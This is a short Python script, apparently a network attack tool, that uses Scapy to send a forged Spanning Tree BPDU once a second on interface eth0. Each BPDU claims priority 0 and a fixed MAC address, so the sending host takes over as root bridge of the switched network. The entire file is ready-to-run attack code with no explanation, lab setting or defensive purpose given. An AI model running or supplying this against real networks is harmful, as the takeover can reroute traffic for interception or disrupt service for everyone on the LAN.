from scapy.all import *
import time

try:
    while True:
        bpdu = (Ether(dst="01:80:c2:00:00:00", src="08:00:27:8a:35:d2") /
                LLC(dsap=0x42, ssap=0x42, ctrl=3) /
                STP(bpdutype=0, bpduflags=0,
                    rootid=0, rootmac="08:00:27:8a:35:d2",
                    pathcost=0,
                    bridgeid=0, bridgemac="08:00:27:8a:35:d2",
                    portid=0x8001, age=0, maxage=20, hellotime=1, fwddelay=15))
        sendp(bpdu, iface="eth0", verbose=False)
        print("BPDU sent")
        time.sleep(1)

except KeyboardInterrupt:
    print("Stopped")